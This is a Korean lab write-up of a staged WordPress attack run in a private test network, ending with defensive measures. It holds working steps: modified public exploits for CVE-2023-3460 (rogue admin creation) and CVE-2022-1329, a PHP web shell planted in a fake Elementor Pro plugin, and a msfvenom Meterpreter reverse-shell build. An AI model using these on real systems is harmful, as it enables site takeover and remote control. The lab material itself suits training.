
## Cyber Kill Chain이란?

- 사이버 보안 모델 중 하나로, **록히드 마틴(Lockheed Martin)** 이 최초로 발표
- 군사 공격 개념에서 출발했으며, 공격(침입) 과정을 일련의 순차적인 단계로 나누어 분석함


`1.정찰 → 2. 무기화 → 3. 전달 → 4. 공격 실행 → 5. 설치 → 6. C&C → 7. 목표 달성`



**사전 준비**

1. `192.168.0.0/24` 대역의 공격자 PC(Kali)에서 `192.168.30.1` 접근 시 pfSense 관리자 페이지가 뜬다면, **Advanced에서 프로토콜을 HTTPS로 변경**
2. 공격자 PC(Kali)에 한글 폰트 설치

---

## 정찰


### nmap 호스트 식별 (ping 스윕)


```bash
nmap -sn 192.168.0.0/24
```

- `-sn` : 포트 스캔 없이 호스트 생존 여부만 검사 (구 `-sP`)


### nmap 서비스·버전·전체 포트 스캔


```bash
nmap -sV -sC -p- 192.168.0.130
```

- `-sV` : 버전 탐지 (Version Detection)
- `-sC` : 기본 스크립트 스캔 (Default Script Scanning)
- `-p-` : 전체 포트 스캔 (1 – 65535)
- 열려있는 포트에서 어떤 서비스가 실행 중인지(+정확한 버전) 확인
- 익명 FTP 접속 허용 여부, SSH 호스트 키 확인, robots.txt 분석 등 기본 설정 오류·위험 요소 스캐닝
- 기본 1,000개 주요 포트(well-known port)뿐 아니라 1 – 65535번 포트를 빠짐없이 스캔


### wpscan 도구 활용

- API Key 발급: [https://wpscan.com/register/](https://wpscan.com/register/) 회원가입 → 메일 인증 → 로그인 시 API 키 발급
![](../Images/Pasted%20image%2020261019111502.png)
```bash
# 발급받은 키를 환경변수로 등록 
export WP_SCAN_KEY=<WPSCAN_API_TOKEN>

# 공격적 플러그인 탐지 (숨겨진 취약점 정보까지 수집)
wpscan --url http://192.168.0.130 --api-token $WP_SCAN_KEY --plugins-detection aggressive

# 기본 스캔
wpscan --url http://192.168.0.130 --api-token $WP_SCAN_KEY
```

- `--plugins-detection aggressive` : 플러그인을 적극적으로 탐색해 숨겨진 취약점(정보)까지 수집

#### 탐지된 주요 취약점

| 플러그인            | 버전    | CVE           | 내용                         |
| --------------- | ----- | ------------- | -------------------------- |
| ultimate-member | 2.6.6 | CVE-2023-3460 | 비인가자가 관리자 계정을 생성할 수 있는 취약점 |
| elementor       | 3.6.1 | CVE-2022-1329 | 파일 업로드 → RCE로 이어질 수 있는 취약점 |



![](../Images/Pasted%20image%2020261019111435.png)



![](../Images/Pasted%20image%2020261019111809.png)


---
## 2. 무기화 (Weaponization)

> 초기 침투용 Exploit 준비

### CVE-2023-3460 (Ultimate Member)

- Ultimate Member 플러그인은 사용자 등록 시 특정 메타데이터 키를 사용자가 직접 수정하지 못하도록 **블랙리스트(Black List) 필터링** 방식을 사용
- 필터링 로직에 결함이 있어 **대소문자 혹은 특정 인코딩**으로 우회 가능
- 공격 흐름: 회원가입 요청 패킷에 조작된 필드 포함 전송 → 필터링 로직 우회 값이 서버에서 그대로 처리 → 일반 사용자여야 할 요청이 **관리자(administrator) 권한 계정**으로 생성
- 인증 없이 원격에서 최고 권한(WordPress 관리자) 계정 생성·탈취 가능 → **CVSS 9.8 (Critical)**



```bash
mkdir ~/Exploit
cd ~/Exploit
git clone https://github.com/gbrsh/CVE-2023-3460.git
cd CVE-2023-3460
ls -al          # exploit.py 존재 확인
vim exploit.py
```

![](../Images/Pasted%20image%2020261019112752.png)


```python
# 계정 정보 설정
username = "mooniexploit"
password = "mooni123"
email    = "mhj2973@naver.com"

# 48~52행: form_id 파싱 라인 추가
try:
    r = s.get(f'{target}/index.php/register/', headers=headers, verify=False)
    nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
    # ↓ 아래 라인 추가
    form_id = re.search(r"name=\"form_id\" id=\"form_id_(.{1})\"", r.text).groups()[0]
    print(Fore.GREEN + f"{nonce}")

# 74~79행: 응답 상태코드 조건 수정
r = s.post(f'{target}/index.php/register/', data=data, headers=headers, verify=False)
# (삭제) if r.history[0].status_code == 302:
if r.status_code == 200 or r.status_code == 301 or r.status_code == 302:
    print(Fore.GREEN + f'done')
else:
    print(Fore.RED + f'error...')
exit()

# 108행: form_id 파라미터 삭제
# add_admin(args.url, 6)  →  add_admin(args.url)
```
![](../Images/Pasted%20image%2020261019112856.png)
### CVE-2022-1329 (Elementor)

- **Elementor(무료) 플러그인**의 AJAX 기능에 권한 검증 로직이 부적절/누락됨
    - 선행 조건: 로그인된(authenticated) 사용자 필요
- 서버에 악성 PHP 파일을 설치하고 **RCE(원격 코드 실행)** 가능


```bash
cd ~/Exploit
git clone https://github.com/Grazee/CVE-2022-1329-Wordpress-Elementor-RCE.git
mv CVE-2022-1329-Wordpress-Elementor-RCE CVE-2022-1329   # 실제 클론 폴더명 확인 후 맞추기
vim /home/kali/Exploit/CVE-2022-1329/poc.py
```

**poc.py 수정 사항**

```python
payloadFileName = 'elementor-pro.zip'
baseUrl  = 'http://192.168.0.200/'
username = "schexploit"
password = "Schexploit123"
...
regexp = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"(.+?)"\\}')
```




**악성 플러그인 페이로드 제작**


```bash
cd ~/Exploit/CVE-2022-1329/
unzip elementor-pro.zip
vim /home/kali/Exploit/CVE-2022-1329/elementor-pro/elementor-pro.php
```


```php
<?php
  // phpinfo();                                  // phpinfo 삭제
  @isset($_GET['cmd']) && system($_GET['cmd']);  // RCE용 코드 추가
```


```bash
cd ~/Exploit/CVE-2022-1329/
rm elementor-pro.zip                       # 기존 zip 삭제
zip -ry elementor-pro.zip elementor-pro    # 수정한 코드 재압축
```


### Meterpreter 리버스 쉘 생성 (msfvenom)



```bash
cd ~/Exploit
msfvenom -p linux/x64/meterpreter_reverse_http LHOST=<공격자_IP> LPORT=80 -f elf -o http_shell
# 예) msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.0.132 LPORT=80 -f elf -o http_shell
```

- **msfvenom** : Metasploit 프레임워크에 포함된 독립형 페이로드 생성·인코딩 도구
- **meterpreter** : Metasploit의 Post-Exploit 단계 페이로드. 침투 후 시스템 제어·정보 탈취 등 다양한 사후 행위를 수행할 수 있는 대화형 쉘(Shell)을 제공

---

## 3. 전달 (Delivery)

정찰과 무기화가 끝난 뒤, 취약한 워드프레스 서버에 관리자 권한 계정과 악성 플러그인 페이로드를 전달하였다.

### CVE-2023-3460

Ultimate Member 2.6.6의 회원가입 페이지를 대상으로 PoC를 실행하였다. 실행 결과, 일반 회원가입 요청을 통해 관리자 권한 계정이 생성되었다.

```text
Site version: 2.6.6 - vulnerable!
Getting nonce: ...
Adding a new admin: done

All set! You can now login using the following credentials:
Username: kisecexploit
Password: Kisec123
```

생성된 계정으로 워드프레스 로그인 페이지에 접속한 결과 관리자 대시보드가 표시되었다.

### CVE-2022-1329

관리자 계정으로 Elementor 3.6.1을 설치하고, 악성 Elementor Pro 압축파일을 준비하였다.

`elementor-pro.php`에는 `cmd` 파라미터를 서버 명령으로 전달하는 PHP 코드가 포함되어 있다.

```php
@isset($_GET['cmd']) && system($_GET['cmd']);
```

초기 압축파일은 주석 시작 구문이 누락되어 플러그인 활성화에 실패했다. 이후 `/*`를 복구하고 PHP 문법 검사를 수행하였다.

```bash
php -l /tmp/elementor-pro.php
```

```text
No syntax errors detected
```

수정한 파일을 다시 압축하여 워드프레스 관리자 화면에서 업로드하였다.

---

## 4. 공격 실행 (Exploitation)

CVE-2023-3460 PoC 실행 후 생성된 계정으로 로그인하여 관리자 페이지 접근을 확인하였다. 이후 Elementor 3.6.1 환경에 수정된 Elementor Pro를 업로드·활성화하고 서버 측 명령 실행이 가능한 상태를 확인하였다.

실습 영상에서는 다음과 같은 Meterpreter 세션 프롬프트와 워드프레스 설치 경로의 파일 목록이 확인되었다.

```text
meterpreter >
```

영상만으로는 실행 계정의 UID가 표시되지 않아 root 권한 획득까지는 확정할 수 없다.

---

## 5. 설치 (Installation)

원격 코드 실행이 가능한 환경에서 Linux x64 HTTP reverse payload를 대상 서버에 전달하고 공격자 측 Metasploit 핸들러와 연결하였다.

---

## 6. 명령 및 제어 (Command and Control)

HTTP 기반 통신을 통해 대상 서버의 페이로드와 공격자 측 핸들러 사이에 Meterpreter 세션이 생성되었다.

```text
meterpreter >
```

---

## 7. 목표 달성 (Actions on Objectives)

| 단계 | 확인 결과 |
| --- | --- |
| 정찰 | 워드프레스와 플러그인 버전 식별 |
| CVE-2023-3460 | Ultimate Member 2.6.6에서 관리자 계정 생성 |
| 관리자 접근 | 생성된 계정으로 관리자 화면 접근 |
| CVE-2022-1329 | Elementor 3.6.1 환경에서 악성 플러그인 업로드 |
| 원격 코드 실행 | `cmd` 파라미터 기반 서버 명령 실행 구조 확인 |
| Meterpreter 연결 | 공격자 측 세션 생성 |
| 파일 접근 | 워드프레스 설치 디렉터리 목록 조회 |
| 권한 확인 | root 권한 여부는 별도 증적 필요 |

---

## 실습 결과 요약

정찰 → 취약한 플러그인 버전 식별 → 관리자 계정 생성 → 관리자 페이지 접근 → 악성 플러그인 업로드 → 원격 코드 실행 → Meterpreter 세션 연결 → 대상 서버 파일 접근의 공격 흐름을 확인하였다.

---

## 대응 방안

- Ultimate Member와 Elementor를 최신 버전으로 업데이트
- 사용하지 않는 플러그인 제거
- 관리자 계정에 다중 인증 적용
- 신규 사용자 등록 시 권한 관련 필드 서버 측 검증
- 업로드 디렉터리에서 PHP 실행 차단
- 웹 서버 프로세스를 최소 권한으로 실행
- 관리자 계정 생성 및 플러그인 설치 이벤트 모니터링
- 비정상 외부 HTTP 연결과 신규 프로세스 생성 모니터링
- 실습 종료 후 생성 계정, 악성 플러그인, 페이로드 및 핸들러 세션 제거
